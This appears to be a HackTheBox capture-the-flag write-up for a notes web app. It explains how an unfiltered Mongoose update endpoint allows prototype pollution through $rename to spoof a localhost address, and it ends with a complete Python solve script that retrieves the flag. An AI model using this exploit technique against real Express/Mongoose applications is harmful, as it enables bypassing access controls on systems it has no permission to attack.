# Secure Notes - HackTheBox Web Challenge


## Initial Interaction

- The webapp is a simple notes app that stores notes on the server and in the client's localStorage.
- The source code consists of a standard html,css and js frontend and an app.js (server side) which uses express.js

```javascript
{
  "name": "secnotes",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "dependencies": {
    "express": "^4.18.2",
    "mongoose": "^7.2.4"
  }
```

- We can see that it uses express 4.18.2 and mongoose 7.2.4


## Code Review

- At first glance, it seems like simple backend code written in express.js, and this line of code made me suspect some sort of hidden SSRF bug initially.

```javascript
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
        res.send(process.env.FLAG ?? 'HTB{f4k3_fl4g_f0r_t3st1ng}');
    } else {
        res.status(403).json({ Message: 'Access denied' });
    }
});
```

- The `/create` endpoint is normal for the most part with proper input sanitization. It validates everything and ensures only string values are passed to the server.

- The `/update` endpoint however is quite interesting. It doesn't perform the input sanitizations which `/create` is performing.

```javascript
app.post('/update', async (req, res) => {
    try {
        const { noteId } = req.body;
        await Note.findByIdAndUpdate(noteId, req.body);
        let result = await Note.find({ _id: noteId });
        res.json(result);
    } catch (error) {
        console.error(error);
        res.status(500).json({ Message: "An error occurred" });
    }
});
```

- We can see that it is directly passing in req.body with no filtering to findByIdAndUpdate, this gives us an opportunity to inject some malicious mongodb scripts in there.
- By catching this minor detail the exploit path begins to make sense.
    1. Mongoose version is 7.2.4
    2. Only requests from 127.0.0.1 or any other local IP is accepted.
    3. Update endpoint takes untrusted req.body for mongo processing.

- Mongoose 7.2.4 is actually vulnerable to a prototype pollution vulnerability as detailed [here](https://pentest-tools.com/vulnerabilities-exploits/mongoose-web-server-734-prototype-pollution-vulnerability_20346).
- So we can make use of the `$rename` operator to pollute the javascript prototypes into the values we want.


- So this is our chain, we'll first create 3 notes, 1 with the title "127.0.0.1", which we'll pollute via the update endpoint using the `$rename` operator to set the address of the client to 127.0.0.1
- Then we'll create another note with the port 3000, which again we'll use the set the port on the client using prototype pollution.
- Then we'll set the family to IPv4 so that we can specify that we're specifying an IPv4 loopback.


- Here, the NodeJS internal gadget prototype._peername was found to work so we'll be using that.
- I have included the solve script below:

```python
import requests
import sys

host, port = sys.argv[1], sys.argv[2]


url = f"http://{host}:{port}"
flag_endpt = f"{url}/flag"

# Start by creating 3 notes and storing their IDs

ids = []
session = requests.Session()

notes = [
    {
        "title":"127.0.0.1", # So $rename will move data into whatever value we want, so here, I want __proto__._peername.address to be set to 127.0.0.1, so I keep the title as such.
        "content":"Note 1",
    },
    {
        "title":"IPv4", # Same with this, but for _peername.family
        "content":"Note 2",
    },
    {
        "title":"1337", # Again, same for port
        "content":"Note 3"
    },
]

for note_dict in notes:
    res = session.post(f"{url}/create", json=note_dict)
    json_res = res.json()
    print(json_res)
    ids.append(json_res.get("_id"))

# Now use the vulnerable update endpoint to perform prototype pollution

# Build the payloads
payloads = [
    {
        "noteId":ids[0],
        "$rename":{"title":"__proto__._peername.address"}
    },
    {
        "noteId":ids[1],
        "$rename":{"title":"__proto__._peername.family"}
    },
    {
        "noteId":ids[2],
        "$rename":{"title":"__proto__._peername.port"}
    }
]

# Post all the data
for i in payloads:
    res = session.post(f"{url}/update", json=i)

# Trigger init() by visiting the update endpoint again. Since the find() function is being executed the prototypes get polluted
dummy = session.post(f"{url}/update", json={"noteId":ids[0], "content":"dummy"})

res = session.get(flag_endpt)
print(res.text)
```
